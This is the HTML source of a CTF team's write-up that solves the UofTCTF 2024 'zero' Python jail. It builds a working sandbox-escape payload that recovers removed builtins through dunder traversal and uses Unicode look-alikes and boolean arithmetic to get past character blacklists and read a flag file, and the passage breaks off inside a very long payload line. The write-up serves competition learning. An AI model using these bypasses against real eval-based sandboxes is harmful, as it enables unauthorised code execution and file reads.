@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>UofTCTF - [zero] - Misc :: L3ak CTF</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Writeup for zero from UofTCTF 2024. " />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="https://l3ak.team/posts/uoftctf/" />
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="https://l3ak.team/styles.css">
+
+
+
+
+
+
+
+  <link rel="shortcut icon" href="https://l3ak.team/icon.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="UofTCTF - [zero] - Misc">
+<meta property="og:description" content="Writeup for zero from UofTCTF 2024. " />
+<meta property="og:url" content="https://l3ak.team/posts/uoftctf/" />
+<meta property="og:site_name" content="L3ak CTF" />
+
+  
+    <meta property="og:image" content="https://l3ak.team/icon.png">
+  
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2024-01-28 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/home">
+  <div class="logo">
+    [root@L3ak:~]# 
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/home">Home</a></li>
+        
+      
+        
+          <li><a href="/members">Members</a></li>
+        
+      
+        
+          <li><a href="/posts">Write-ups</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/home" >Home</a></li>
+        
+      
+        
+          <li><a href="/members" >Members</a></li>
+        
+      
+        
+          <li><a href="/posts" >Write-ups</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="https://l3ak.team/posts/uoftctf/">UofTCTF - [zero] - Misc</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2024-01-28</time><span class="post-author">Suvoni</span></div>
+
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <h1 id="uoft-ctf-2024-writeup-team-l3ak-3rd-place">UofT CTF 2024 Writeup (Team: L3ak, 3rd Place)<a href="#uoft-ctf-2024-writeup-team-l3ak-3rd-place" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Competition URL: <a href="https://play.uoftctf.org/">https://play.uoftctf.org/</a></p>
+<h2 id="overview">Overview<a href="#overview" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<table>
+<thead>
+<tr>
+<th>Challenge</th>
+<th>Category</th>
+<th>Points</th>
+<th>Flag</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>zero</td>
+<td>jail</td>
+<td>494</td>
+<td>uoftctf{zero_security_too_apparently_lmao}</td>
+</tr>
+</tbody>
+</table>
+<h2 id="zero">zero<a href="#zero" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>In this challenge, we are given the following PyJail:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">check</span>(code):
+    <span style="color:#75715e"># no letters</span>
+    alphabet <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#34;</span>
+    <span style="color:#75715e"># no numbers</span>
+    numbers <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;0123456789&#34;</span>
+    <span style="color:#75715e"># no underscores</span>
+    underscore <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;__&#34;</span>
+    
+    <span style="color:#66d9ef">return</span> <span style="color:#f92672">not</span> any((c <span style="color:#f92672">in</span> alphabet) <span style="color:#f92672">or</span> (c <span style="color:#f92672">in</span> numbers) <span style="color:#f92672">or</span> (underscore <span style="color:#f92672">in</span> code) <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> code)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">safe_eval</span>(code):
+    <span style="color:#66d9ef">if</span> (check(code)):
+        g <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;__builtins__&#39;</span>: <span style="color:#66d9ef">None</span>}
+        l <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;__builtins__&#39;</span>: <span style="color:#66d9ef">None</span>}
+        <span style="color:#66d9ef">return</span> print(eval(code, g, l )) <span style="color:#75715e"># good luck!</span>
+    <span style="color:#66d9ef">else</span>:
+        print(<span style="color:#e6db74">&#34;lol no&#34;</span>)
+        
+code <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;&gt;&gt;&gt; &#34;</span>)
+safe_eval(code)
+</code></pre></div><p>This code sanitizes our input by removing all builtins and enforcing a blacklist on alphanumeric characters and double underscores &ldquo;__&rdquo;. This severely limits our ability to execute code, but as a wise man once said&hellip;</p>
+<p><img src="./images/nothing-is-impossible-shia-labeouf.gif" alt="gif1"></p>
+<p>As soon as I saw this challenge, I immediately remembered two very similar challenges I solved from BYUCTF 2023: <a href="https://github.com/BYU-CSA/BYUCTF-2023/tree/main/builtins-2">one which removed builtins</a> and <a href="https://github.com/BYU-CSA/BYUCTF-2023/tree/main/a-z0-9">another which blacklisted alphanumeric characters</a>. As this challenge is essentially a combination of the two, my solution incorporates similar techniques.</p>
+<p>Our ultimate goal is to read the <code>flag</code> file whose name/path is visible in the Dockerfile. In the absence of any restrictions, we could do this with something like</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python">print(open(<span style="color:#e6db74">&#39;flag&#39;</span>)<span style="color:#f92672">.</span>read()) <span style="color:#75715e"># (1)</span>
+</code></pre></div><p>However, here we have several restrictions which prevent this simple code injection. The first one we need to bypass is the removal of builtins, which are native Python functions (such as <code>print()</code>) that are typically available by default. To recover these, we can exploit <a href="https://www.tutorialsteacher.com/python/magic-methods-in-python">the dunder method hierarchy</a> on Python objects like lists <code>[]</code>, tuples <code>()</code>, etc. In essence, we can traverse &ldquo;up&rdquo; and &ldquo;down&rdquo; the dunder method hierarchy to access all builtin methods which were removed in the sanitization. The following will do the same as (1) above, bypassing the builtins removal:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python">()<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__bases__[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">121</span>]<span style="color:#f92672">.</span>get_data(<span style="color:#e6db74">&#39;.&#39;</span>,<span style="color:#e6db74">&#39;flag&#39;</span>) <span style="color:#75715e"># (2)</span>
+</code></pre></div><p>(For more information on how this works, see <a href="https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes#no-builtins">here</a>. Note that the index <code>121</code> may vary by machine, so some tweaking/bruting may be required.)</p>
+<p>We can improve on (2) above to bypass the <strong>__</strong> blacklist by using Unicode character U+FF3F (<code>＿</code>) (<a href="https://www.compart.com/en/unicode/U+FF3F">found here</a>). Amazingly, Python interprets this character as an underscore in code execution, yet it passes the blacklist check!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python">()<span style="color:#f92672">.</span>_<span style="color:#960050;background-color:#1e0010">＿</span>class_<span style="color:#960050;background-color:#1e0010">＿</span><span style="color:#f92672">.</span>_<span style="color:#960050;background-color:#1e0010">＿</span>bases_<span style="color:#960050;background-color:#1e0010">＿</span>[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>_<span style="color:#960050;background-color:#1e0010">＿</span>subclasses_<span style="color:#960050;background-color:#1e0010">＿</span>()[<span style="color:#ae81ff">121</span>]<span style="color:#f92672">.</span>get_data(<span style="color:#e6db74">&#39;.&#39;</span>,<span style="color:#e6db74">&#39;flag&#39;</span>) <span style="color:#75715e"># (3)</span>
+</code></pre></div><p>Now we need to bypass the alphanumeric character restriction, and this is where the challenge <em>really</em> begins. Buckle up, it&rsquo;s about to get messy&hellip;</p>
+<p><img src="./images/the_office.gif" alt="gif2"></p>
+<p>First let us start with replacing all alphabet characters <code>abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ</code>. Just like with the underscores, we can utilize Unicode alphabet characters for parts of our exploit. The Python interpreter will perceive these as normal alphabet chars, but since they are not standard ASCII, they will bypass the blacklist check. I used some Unicode gothic alphabet characters (found <a href="https://en.wikipedia.org/wiki/Mathematical_Alphanumeric_Symbols">here</a>) as suitable substitutes for most of the exploit above:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python">()<span style="color:#f92672">.</span>_<span style="color:#960050;background-color:#1e0010">＿</span>𝖈𝖑𝖆𝖘𝖘_<span style="color:#960050;background-color:#1e0010">＿</span><span style="color:#f92672">.</span>_<span style="color:#960050;background-color:#1e0010">＿</span>𝖇𝖆𝖘𝖊𝖘_<span style="color:#960050;background-color:#1e0010">＿</span>[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>_<span style="color:#960050;background-color:#1e0010">＿</span>𝖘𝖚𝖇𝖈𝖑𝖆𝖘𝖘𝖊𝖘_<span style="color:#960050;background-color:#1e0010">＿</span>()[<span style="color:#ae81ff">121</span>]<span style="color:#f92672">.</span>𝖌𝖊𝖙_𝖉𝖆𝖙𝖆(<span style="color:#e6db74">&#39;.&#39;</span>,<span style="color:#e6db74">&#39;flag&#39;</span>) <span style="color:#75715e"># (4)</span>
+</code></pre></div><p>Notice that we cannot use these gothic characters for the <code>flag</code> file, since <code>flag</code> is spelled with standard ASCII alphabet characters, and using <code>𝖋𝖑𝖆𝖌</code> will attempt to open a file which doesn&rsquo;t exist. We need Python code which will form the string <code>flag</code> during execution without explicitly using those characters. To get around this, we can use the <code>__doc__</code> dunder attribute to obtain documentation about various objects and index that string to get the character we want. We can then concatenate the characters together to get the word <code>flag</code>! For example, to obtain the character <strong>g</strong>, we can use the following:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python">()<span style="color:#f92672">.</span>_<span style="color:#960050;background-color:#1e0010">＿</span>𝖉𝖔𝖈_<span style="color:#960050;background-color:#1e0010">＿</span>[<span style="color:#ae81ff">38</span>]
+</code></pre></div><p>This will access the tuple documentation and get the 38th character (g):</p>
+<pre tabindex="0"><code>Built-in immutable sequence.\n\nIf no ar(g)ument is given, the constructor returns an empty tuple.\nIf iterable is specified the tuple is initialized from iterable's items.\n\nIf the argument is a tuple, the return value is the same object.
+</code></pre><p>We can update (4) above using this method for all 4 characters of <code>flag</code> to get:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python">()<span style="color:#f92672">.</span>_<span style="color:#960050;background-color:#1e0010">＿</span>𝖈𝖑𝖆𝖘𝖘_<span style="color:#960050;background-color:#1e0010">＿</span><span style="color:#f92672">.</span>_<span style="color:#960050;background-color:#1e0010">＿</span>𝖇𝖆𝖘𝖊𝖘_<span style="color:#960050;background-color:#1e0010">＿</span>[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>_<span style="color:#960050;background-color:#1e0010">＿</span>𝖘𝖚𝖇𝖈𝖑𝖆𝖘𝖘𝖊𝖘_<span style="color:#960050;background-color:#1e0010">＿</span>()[<span style="color:#ae81ff">121</span>]<span style="color:#f92672">.</span>𝖌𝖊𝖙_𝖉𝖆𝖙𝖆(<span style="color:#e6db74">&#39;.&#39;</span>,()<span style="color:#f92672">.</span>_<span style="color:#960050;background-color:#1e0010">＿</span>𝖉𝖔𝖈_<span style="color:#960050;background-color:#1e0010">＿</span>[<span style="color:#ae81ff">31</span>]<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">!=</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">.</span>_<span style="color:#960050;background-color:#1e0010">＿</span>𝖉𝖔𝖈_<span style="color:#960050;background-color:#1e0010">＿</span>[<span style="color:#ae81ff">3</span>]<span style="color:#f92672">+</span>()<span style="color:#f92672">.</span>_<span style="color:#960050;background-color:#1e0010">＿</span>𝖉𝖔𝖈_<span style="color:#960050;background-color:#1e0010">＿</span>[<span style="color:#ae81ff">14</span>]<span style="color:#f92672">+</span>()<span style="color:#f92672">.</span>_<span style="color:#960050;background-color:#1e0010">＿</span>𝖉𝖔𝖈_<span style="color:#960050;background-color:#1e0010">＿</span>[<span style="color:#ae81ff">38</span>]) <span style="color:#75715e"># (5)</span>
+</code></pre></div><p>This will read the <code>flag</code> file, while bypassing all alphabet, double underscore, and builtins restrictions! Don&rsquo;t believe me? Let&rsquo;s do a sanity check:</p>
+<p><img src="./images/sanity.png" alt="img1"></p>
+<p>The last restriction we need to bypass is the one on digits <code>0123456789</code>. This is where my payload becomes monstrously long, and I apologize in advance for any mental anguish or distress I cause readers of this writeup. Turn back now if you have a serious heart condition or experience nauseua when subjected to unapologetically obnoxious one-liners of code.</p>
+<p>The basic idea to replace digits (which two of my teammates, ahh and Matthias, helped me realize) is that in Python, <code>True</code>/<code>False</code> are interpreted as <code>1</code>/<code>0</code> when used in mathematical expressions. Thus, we can replace all numeric values in (5) with <code>True+True+True+...</code> for all integers &gt; 0 and <code>False</code> in the case of 0. To avoid using the strings <code>True</code> and <code>False</code> <em>directly</em>, we can substitute expressions which <em>evaluate</em> to <code>True</code>/<code>False</code>, such as <code>(''=='')</code> (True) and <code>(''!='')</code> (False). Thus, to form any integer, we can just add arbitrary amounts of <code>(''=='')+(''=='')+...</code> together. While simple in concept, this substitution lengthens the payload <strong>considerably :)</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python">()<span style="color:#f92672">.</span>_<span style="color:#960050;background-color:#1e0010">＿</span>𝖈𝖑𝖆𝖘𝖘_<span style="color:#960050;background-color:#1e0010">＿</span><span style="color:#f92672">.</span>_<span style="color:#960050;background-color:#1e0010">＿</span>𝖇𝖆𝖘𝖊𝖘_<span style="color:#960050;background-color:#1e0010">＿</span>[<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;𝖈&#39;</span>]<span style="color:#f92672">.</span>_<span style="color:#960050;background-color:#1e0010">＿</span>𝖘𝖚𝖇𝖈𝖑𝖆𝖘𝖘𝖊𝖘_<span style="color:#960050;background-color:#1e0010">＿</span>()[(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span 